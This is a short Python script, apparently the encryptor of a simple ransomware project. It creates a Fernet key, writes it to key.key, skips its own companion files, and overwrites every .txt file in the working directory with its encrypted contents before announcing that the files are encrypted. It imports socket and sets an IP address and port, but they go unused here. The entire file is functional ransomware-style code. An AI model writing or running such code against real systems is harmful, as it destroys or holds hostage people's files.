from cryptography.fernet import Fernet
import os
import socket

ip_address = "192.168.0.35"
port = 5075
hostname = os.getenv('COMPUTERNAME')
dir_path = os.environ.items()

key = Fernet.generate_key()

with open("key.key","wb") as f:
  f.write(key)
  
fernet =  Fernet(key)

files = []

for file in os.listdir():
	if file == "server.py" or file == "key.key" or file == "client.py" or file == "decrypt.py" or file =="encrypt.py":
		continue

	if os.path.isfile(file):
		files.append(file)

for file in files:

	if str(file).endswith(".txt"):
            with open(str(file),"rb") as f:
                # deepcode ignore HandleUnicode: <please specify a reason of ignoring this>
                data = f.read()
            encrypt = fernet.encrypt(data)
                
            with open(str(file),"wb") as f:
                f.write(encrypt)
		
print("Your file is Encrypted:")




    



